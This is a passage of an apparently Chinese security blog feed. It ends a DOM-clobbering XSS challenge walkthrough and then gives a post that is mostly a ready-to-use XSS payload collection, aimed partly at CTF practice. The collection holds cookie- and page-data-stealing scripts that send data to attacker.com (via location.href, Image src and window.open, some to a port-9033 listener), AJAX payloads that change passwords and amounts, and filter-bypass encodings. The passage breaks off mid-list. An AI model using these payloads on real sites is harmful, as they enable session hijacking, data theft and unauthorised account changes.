src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233648645.png" alt="image-20250718233648645"></p><p>然后 下一个字符是 <strong>Anything else</strong>  将当前输入字符附加到注释标记的数据中。也就是<code>&lt;!--?--&gt;</code>,</p><p>这里举个列子：输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaa&lt;</span><br><span class="line">aaa&lt;!--?--&gt;</span><br><span class="line">aaa&lt;!--?b--&gt;</span><br><span class="line">aaa&lt;!--?bb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;c</span><br><span class="line">aaa&lt;!--?bbb--&gt;cc</span><br><span class="line">aaa&lt;!--?bbb--&gt;ccc</span><br></pre></td></tr></table></figure><p>直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</p><p>那么我们就可以试着传值测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234143650.png" alt="image-20250718234143650"></p><p>也是成功弹窗了，我们再次打断点看看具体是什么流程</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234243274.png" alt="image-20250718234243274"></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234255751.png" alt="image-20250718234255751"></p><p>与我们的预想完全一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>这两个都可以，但是切记不要用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>原因就是<code>/</code> 被过滤了，就算没被过滤也不会被执行</p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718235939727.png" alt="image-20250718235939727"></p><p>w3c文档清楚的进行了说明</p><p><code>document.write()</code> <code>script </code> <code>innerHTML</code>  <code>outerHTML</code> </p><p><em>使用该方法插入时，元素通常会执行（通常会阻止进一步的脚本执行或 HTML 解析）。当使用 和 属性插入时，它们根本不会执行。</em></p><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000131057.png" alt="image-20250719000131057"></p><p>这里他也说明了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">官方文档</a></p><h5 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000937250.png" alt="image-20250719000937250"></p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;number id=&quot;number&quot; style=&quot;display:none&quot;&gt;&lt;/number&gt;</span><br><span class="line">&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;welcome&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;keanu&quot; class=&quot;btn btn-primary btn-sm&quot; data-toggle=&quot;popover&quot; data-content=&quot;DM @PwnFunction&quot;</span><br><span class="line">    data-trigger=&quot;hover&quot; onclick=&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;&gt;Solved it?&lt;/button&gt;</span><br><span class="line">    </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    /* Input */</span><br><span class="line">    var number = (new URL(location).searchParams.get(&#x27;number&#x27;) || &quot;7&quot;)[0],</span><br><span class="line">        name = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;name&#x27;), &#123; SAFE_FOR_JQUERY: true &#125;);</span><br><span class="line">    $(&#x27;number#number&#x27;).html(number);</span><br><span class="line">    document.getElementById(&#x27;welcome&#x27;).innerHTML = (`Welcome &lt;b&gt;$&#123;name || &quot;Mr. Wick&quot;&#125;!&lt;/b&gt;`);</span><br><span class="line"></span><br><span class="line">    /* Greet */</span><br><span class="line">    $(&#x27;#keanu&#x27;).popover(&#x27;show&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        $(&#x27;#keanu&#x27;).popover(&#x27;hide&#x27;)</span><br><span class="line">    &#125;, 2000)</span><br><span class="line"></span><br><span class="line">    /* Check Magic Number */</span><br><span class="line">    var magicNumber = Math.floor(Math.random() * 10);</span><br><span class="line">    var number = eval($(&#x27;number#number&#x27;).html());</span><br><span class="line">    if (magicNumber === number) &#123;</span><br><span class="line">        alert(&quot;You&#x27;re Breathtaking!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;DOM破坏基础&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XSS" scheme="https://heisha123.github.io/tags/XSS/"/>
    
    <category term="DOM破坏" scheme="https://heisha123.github.io/tags/DOM%E7%A0%B4%E5%9D%8F/"/>
    
  </entry>
  
  <entry>
    <title>XSS-全</title>
    <link href="https://heisha123.github.io/2025/07/14/XSS-%E5%85%A8/"/>
    <id>https://heisha123.github.io/2025/07/14/XSS-%E5%85%A8/</id>
    <published>2025-07-14T01:18:54.000Z</published>
    <updated>2025-07-19T04:02:57.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>XSS (Cross-Site Scripting) 是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使得其他用户在访问该页面时执行这些脚本。</p><span id="more"></span><h3 id="XSS-的危害"><a href="#XSS-的危害" class="headerlink" title="XSS 的危害"></a>XSS 的危害</h3><blockquote><p>窃取用户 Cookie<br>劫持用户会话<br>修改网页内容<br>钓鱼攻击<br>传播恶意软件</p></blockquote><h2 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h2><p><strong>反射型 XSS</strong></p><blockquote><p>恶意脚本通过 URL 参数等方式注入<br>服务器将恶意脚本反射回浏览器执行<br>通常需要用户点击特定链接才能触发</p></blockquote><p><strong>存储型 XSS</strong></p><blockquote><p>恶意脚本被永久存储在服务器上<br>当其他用户访问包含恶意脚本的页面时触发<br>影响范围更大，危害更严重</p></blockquote><p><strong>DOM 型 XSS</strong></p><blockquote><p>完全在客户端执行<br>不依赖服务器响应<br>通过修改 DOM 结构触发</p></blockquote><h2 id="Payload-集合"><a href="#Payload-集合" class="headerlink" title="Payload 集合"></a>Payload 集合</h2><h3 id="1-基础-Payloads"><a href="#1-基础-Payloads" class="headerlink" title="1. 基础 Payloads"></a>1. 基础 Payloads</h3><h4 id="1-1-基本弹窗"><a href="#1-1-基本弹窗" class="headerlink" title="1.1 基本弹窗"></a>1.1 基本弹窗</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><h4 id="1-2-闭合标签"><a href="#1-2-闭合标签" class="headerlink" title="1.2 闭合标签"></a>1.2 闭合标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="1-3-事件处理器"><a href="#1-3-事件处理器" class="headerlink" title="1.3 事件处理器"></a>1.3 事件处理器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;div onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;hover me&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="2-高级攻击脚本"><a href="#2-高级攻击脚本" class="headerlink" title="2. 高级攻击脚本"></a>2. 高级攻击脚本</h3><h4 id="2-1-基础脚本标签"><a href="#2-1-基础脚本标签" class="headerlink" title="2.1 基础脚本标签"></a>2.1 基础脚本标签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 基本弹窗 --&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;   &lt;!-&gt; 弹出hello --&gt;</span><br><span class="line">&lt;script&gt;alert(/hello/)&lt;/script&gt;   &lt;!-&gt; 弹出hello --&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;        &lt;!-&gt; 弹出1,对于数字可以不用引号 --&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;      &lt;!-&gt; 弹出cookie --&gt;</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  &lt;!-&gt; 引用外部的xss --&gt;</span><br></pre></td></tr></table></figure><h4 id="2-2-数据窃取脚本"><a href="#2-2-数据窃取脚本" class="headerlink" title="2.2 数据窃取脚本"></a>2.2 数据窃取脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 使用 window.location.href --&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 document.location.href --&gt;</span><br><span class="line">&lt;script&gt;document.location.href=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 window.open --&gt;</span><br><span class="line">&lt;script&gt;window.open=&quot;http://attacker.com/collect?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 获取特定元素内容 --&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&quot;http://attacker.com/collect?data=&quot;+document.getElementsByClassName(&#x27;target-class&#x27;)[0].innerHTML&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery 选择器 --&gt;</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery 选择器（带过滤） --&gt;</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;</span><br><span class="line">    if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;</span><br><span class="line">        window.location.href = &#x27;http://attacker.com/&#x27; +value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 querySelector --&gt;</span><br><span class="line">&lt;script&gt;var img = new Image();</span><br><span class="line">img.src = &quot;http://attacker.com/&quot;+document.querySelector(&#x27;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;).textContent;</span><br><span class="line">document.body.append(img);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-3-特殊标签利用"><a href="#2-3-特殊标签利用" class="headerlink" title="2.3 特殊标签利用"></a>2.3 特殊标签利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; SVG 标签 --&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(1)&quot;//</span><br><span class="line">&lt;svg onload=&quot;location.href=&#x27;http://attacker.com/collect?c=&#x27;+document.cookie&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Body 标签 --&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;body onpageshow=alert(1)&gt;</span><br><span class="line">&lt;body onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line">&lt;body/**/onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line">&lt;body/onload=location.href=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Video 标签 --&gt;</span><br><span class="line">&lt;video onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp4&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Style 标签 --&gt;</span><br><span class="line">&lt;style onload=alert(1)&gt;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; Iframe 标签 --&gt;</span><br><span class="line">&lt;iframe onload=document.location=&#x27;http://attacker.com/collect?cookie=&#x27;+document.cookie&gt;&#x27;</span><br></pre></td></tr></table></figure><h4 id="2-4-特殊场景-Payloads"><a href="#2-4-特殊场景-Payloads" class="headerlink" title="2.4 特殊场景 Payloads"></a>2.4 特殊场景 Payloads</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 使用 Image 对象 --&gt;</span><br><span class="line">&lt;script&gt;var img = new Image();img.src = &quot;http://attacker.com/&quot;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 XMLHttpRequest --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var httpRequest = new XMLHttpRequest();</span><br><span class="line">httpRequest.open(&#x27;POST&#x27;, &#x27;http://attacker.com/api/change.php&#x27;, true);</span><br><span class="line">httpRequest.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">httpRequest.send(&#x27;p=1234567&#x27;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/amount.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;u&#x27;:&#x27;1&#x27;,&#x27;a&#x27;:&#x27;&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX 修改密码 --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/change.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;p&#x27;:&#x27;1717&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 使用 jQuery AJAX 修改金额 --&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;</span><br><span class="line">    url:&quot;api/amount.php&quot;,</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    data:&#123;&#x27;u&#x27;:&#x27;1&#x27;,&#x27;a&#x27;:&#x27;&#x27;&#125;</span><br><span class="line">&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-5-监控脚本"><a href="#2-5-监控脚本" class="headerlink" title="2.5 监控脚本"></a>2.5 监控脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 使用 nc 监控</span><br><span class="line">&lt;script&gt;window.open(&#x27;http://attacker.com:9033/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 使用 jQuery 监控</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">    if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;</span><br><span class="line">        window.location.href=&#x27;http://attacker.com:9033/&#x27;+value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// 使用 jQuery 监控（带过滤）</span><br><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;</span><br><span class="line">    if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;</span><br><span class="line">        window.location.href = &#x27;http://attacker.com:9033/&#x27; +value.innerHTML;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="3-绕过技巧"><a href="#3-绕过技巧" class="headerlink" title="3. 绕过技巧"></a>3. 绕过技巧</h3><h4 id="3-1-标签名绕过"><a href="#3-1-标签名绕过" class="headerlink" title="3.1 标签名绕过"></a>3.1 标签名绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 大小写混淆 --&gt;</span><br><span class="line">&lt;iMg onerror=alert(1) src=a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 插入 NULL 字节 --&gt;</span><br><span class="line">&lt;%00img onerror=alert(1) src=a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 空格替代字符 --&gt;</span><br><span class="line">&lt;img%09onerror=alert(1) src=a&gt;  &lt;!-&gt; Tab --&gt;</span><br><span class="line">&lt;img%0aonerror=alert(1) src=a&gt;  &lt;!-&gt; 换行 --&gt;</span><br><span class="line">&lt;img/&quot;onerror=alert(1) src=a&gt;   &lt;!-&gt; 异常语法 --&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-属性名绕过"><a href="#3-2-属性名绕过" class="headerlink" title="3.2 属性名绕过"></a>3.2 属性名绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img o%00nerror=alert(1) src=a&gt;</span><br><span class="line">&lt;imgonerror=&#x27;alert(1)&#x27;src=a&gt;</span><br></pre></td></tr></table></figure><h4 id="3-3-属性值编码绕过"><a href="#3-3-属性值编码绕过" class="headerlink" title="3.3 属性值编码绕过"></a>3.3 属性值编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;imgonerror=a%00lert(1) src=a&gt;</span><br><span class="line">&lt;imgonerror=a&amp;#x006c;ert(1) src=a&gt;</span><br></pre></td></tr></table></figure><h4 id="3-4-可编码属性"><a href="#3-4-可编码属性" class="headerlink" title="3.4 可编码属性"></a>3.4 可编码属性</h4><h5 id="URL-类型属性（支持-javascript-协议）"><a href="#URL-类型属性（支持-javascript-协议）" class="headerlink" title="URL 类型属性（支持 javascript: 协议）"></a>URL 类型属性（支持 <code>javascript:</code> 协议）</h5><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">href=`</span><br><span class="line">`action=`</span><br><span class="line">`formaction=`</span><br><span class="line">`location=</span><br></pre></td></tr></table></figure></blockquote><h5 id="资源加载类属性（支持-base64-或外链）"><a href="#资源加载类属性（支持-base64-或外链）" class="headerlink" title="资源加载类属性（支持 base64 或外链）"></a>资源加载类属性（支持 base64 或外链）</h5><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">src=`</span><br><span class="line">`data=`</span><br><span class="line">`poster=`</span><br><span class="line">`background=`</span><br><span class="line">`code=</span><br></pre></td></tr></table></figure></blockquote><h5 id="脚本执行类属性"><a href="#脚本执行类属性" class="headerlink" title="脚本执行类属性"></a>脚本执行类属性</h5><blockquote><p><code>on*=</code> 所有以 <code>on</code> 开头的事件处理属性</p></blockquote><h4 id="3-5-字符集与长度限制绕过"><a href="#3-5-字符集与长度限制绕过" class="headerlink" title="3.5 字符集与长度限制绕过"></a>3.5 字符集与长度限制绕过</h4><h5 id="使用非标准编码"><a href="#使用非标准编码" class="headerlink" title="使用非标准编码"></a>使用非标准编码</h5><blockquote><p>UTF-7<br>US-ASCII<br>UTF-16</p></blockquote><h5 id="拆分跨站脚本（用于绕过长度限制）"><a href="#拆分跨站脚本（用于绕过长度限制）" class="headerlink" title="拆分跨站脚本（用于绕过长度限制）"></a>拆分跨站脚本（用于绕过长度限制）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  z=&#x27;&lt;script src=&#x27;;</span><br><span class="line">  z+=&#x27;test.c&#x27;;</span><br><span class="line">  z+=&#x27;n/1.js&gt;&lt;\/script&gt;&#x27;;</span><br><span class="line">  document.write(z);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>执行结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=test.cn/1.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="JavaScript-层面的绕过技巧"><a href="#JavaScript-层面的绕过技巧" class="headerlink" title="JavaScript 层面的绕过技巧"></a>JavaScript 层面的绕过技巧</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; Unicode 编码关键字 --&gt;</span><br><span class="line">&lt;script&gt;a\u006cert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(&#x27;a\u006cert(1)&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 替代点操作符 --&gt;</span><br><span class="line">&lt;script&gt;alert(document[&#x27;cookie&#x27;])&lt;/script&gt;</span><br><span class="line">&lt;script&gt;with(document)alert(cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4-XSS-可插入位置"><a href="#4-XSS-可插入位置" class="headerlink" title="4. XSS 可插入位置"></a>4. XSS 可插入位置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-&gt; 用户输入作为 script 标签内容 --&gt;</span><br><span class="line">&lt;script&gt;用户输入&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为 HTML 注释 --&gt;</span><br><span class="line">&lt;!-&gt; 用户输入 --&gt;</span><br><span class="line">&lt;!-&gt; --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签属性名 --&gt;</span><br><span class="line">&lt;div 用户输入=&quot;xx&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签属性值 --&gt;</span><br><span class="line">&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为标签名 --&gt;</span><br><span class="line">&lt;用户输入 id=&quot;xx&quot; /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-&gt; 用户输入作为 CSS 内容 --&gt;</span><br><span class="line">&lt;style&gt;用户输入&lt;/style&gt;</span><br><span 